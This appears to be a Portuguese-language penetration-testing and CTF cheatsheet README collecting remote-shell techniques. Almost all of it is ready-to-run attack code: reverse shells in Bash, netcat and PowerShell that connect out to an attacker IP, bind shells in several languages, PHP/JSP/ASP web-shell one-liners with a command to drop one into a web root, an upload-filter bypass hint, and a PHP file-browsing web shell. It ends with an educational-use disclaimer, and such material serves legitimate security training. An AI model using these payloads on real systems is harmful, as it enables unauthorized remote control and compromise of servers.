# 🐚 Cheatsheet: Reverse Shells, Bind Shells & TTY

Este repositório traz um conjunto prático de comandos úteis para obtenção de shells remotas durante testes de penetração, exploração ou CTFs.

Gerador de shell reversa bastante útil: [reverse-shell.sh](https://reverse-shell.sh/)
</br>
Reverse Shell Generator
https://www.revshells.com/

---

## 📡 Reverse Shell

Um *reverse shell* é quando a máquina alvo se conecta de volta ao nosso host, nos fornecendo uma shell remota.

- Bash: `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`
- Netcat + FIFO: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 1234 >/tmp/f`
- PowerShell: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"`
- 

---

## 🔗 Bind Shell

Um *bind shell* escuta conexões em uma porta específica da máquina alvo. Diferente do reverse shell, **nós nos conectamos ao alvo**.

- Nc:: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 9001 > /tmp/f`
- Bash: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 1234 >/tmp/f`
- Python: `python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`
- PowerShell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + ' ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

---

## 🖥️ TTY Shell Upgrade

Use isso para obter uma shell mais interativa (ex: com tab-completion e atalhos funcionais):

1. Use: `python -c 'import pty; pty.spawn("/bin/bash")'`
2. Coloque a shell em segundo plano com `CTRL + Z`
3. No seu terminal local, digite: `stty raw -echo`
4. Volte para a shell com `fg` e pressione `Enter` duas vezes
5. A shell agora está interativa!

Podemos notar que nosso shell não cobre todo o terminal. Para corrigir isso, precisamos descobrir algumas variáveis. Podemos abrir outra janela de terminal em nosso sistema, maximizar as janelas ou usar qualquer tamanho que quisermos e, em seguida, inserir os seguintes comandos para obter nossas variáveis:

- Gust4vo@htb[/htb]$ echo $TERM xterm-256color
- Gust4vo@htb[/htb]$ stty size 67 318



---

## ℹ️ Notas

- Substitua `10.10.10.10` pelo seu IP local
- Altere a porta `1234` conforme necessário
- Para escutar conexões, use: `nc -lvnp 1234`

---

## 🌐 Web Shell

A *Web Shell* normalmente é um script web, ou seja., PHP ou ASPX, que aceita nosso comando através de parâmetros de solicitação HTTP, tais como GET ou POST solicitar parâmetros, executa nosso comando e imprime sua saída de volta na página da web.

- php: `<?php system($_GET['ted']);?>`  e depois url&ted=whoami
- jsp: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
- asp: `<% eval request("cmd") %>`

Uma vez que temos o nosso shell web, precisamos colocar o nosso script shell web no diretório web do host remoto (webroot) para executar o script através do navegador web.


Se fosse um Linux executando Apache por exemplo seria `echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`, e podemos acessar a web shell pela URL e pelo curl.

curl "http://example.com/shell.php?cmd=whoami"

---

## Tecnicas de bypass de extensão shell </br>
<img width="542" height="848" alt="image" src="https://github.com/user-attachments/assets/af956b20-0722-46e8-9d86-e8e386792023" />

- GIF89a; na primeira linha tbm util para bypass

---

## Shell em PHP 

Shell simples para navegação e vizualização de diretorios do web server (credits: HackerSec)

```php
<?php
$path = $_GET['v'];
$action = $_GET['a'];

echo "Servidor <br>";

if($action == true){

echo "<textarea class='form-control' name='textl'>";

$arquivo_edit = fopen ($action, 'r') or die("Unable to open file!");

while( !feof($arquivo_edit)){
$linha = fgets($arquivo_edit);
echo htmlspecialchars($linha);

}

fclose($arquivo_edit);


echo "</textarea>";



}else{




if($path == false){
$path = "./";
}else{
$path = $path;
}

$diretorio = dir($path);


while($arquivo = $diretorio -> read()){

$arquivoex = substr($arquivo, strripos($arquivo, '.'));

if($arquivoex == ".php" or $arquivoex == ".js" or $arquivoex == ".css" or $arquivoex == ".txt"){
$mostrar = "<a href='shell.php?a=$path$arquivo'>".$arquivo."</a><br>";
}else{
$mostrar = "<a href='shell.php?v=$path$arquivo/'>".$arquivo."</a><br>";
}

echo $mostrar;

}
$diretorio -> close();
}



?>
```
---

# 🛡️ Disclaimer 

This repository was created **for educational and cybersecurity research purposes only**.  
The use of any information, scripts, or tools contained herein **is the sole responsibility of the user**.  
**I am not responsible for any misuse** or activity that violates local laws or third-party policies.


© [GSecurity]
